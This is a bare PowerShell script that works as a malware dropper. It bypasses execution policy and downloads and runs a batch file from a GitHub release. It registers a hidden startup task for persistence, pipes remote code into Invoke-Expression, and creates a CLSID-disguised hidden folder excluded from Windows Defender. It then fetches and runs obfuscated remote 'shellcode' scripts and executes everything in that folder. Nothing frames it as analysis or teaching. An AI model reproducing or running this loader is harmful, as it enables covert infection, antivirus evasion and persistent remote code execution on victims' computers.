



Set-ExecutionPolicy Bypass -Scope Process -Force

$skid = "skid"

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/siu/main.cmd" -OutFile "$env:temp\download.bat"
    Start-Process -FilePath '$env:temp\download.bat'
}

$os = Get-WmiObject -Class Win32_OperatingSystem
$windowsDrive = [System.IO.Path]::GetPathRoot($os.SystemDirectory)
$filecmd = "$windowsDrive\Windows\System32\winrm.bat"
$task_name = "Windows Startup Task"
$task_action = New-ScheduledTaskAction -Execute $filecmd
$task_trigger = New-ScheduledTaskTrigger -AtStartup
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "startupfile" -RunLevel Highest -Force



Write-Host "[!] Persistence Added" -ForegroundColor Green

iwr https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt |iex

$rdir = "C:\Users\hai1723"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir

$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp

Add-MpPreference -ExclusionPath $dir

# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
# Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

if ($env:USERDOMAIN -ne "DESKTOP-A1L2M8J") {
    $datacode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode2.ps1")
    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$datacode')"
    Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
}





Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
    Write-Output $_.FullName
    Start-Process -FilePath $_.FullName
}

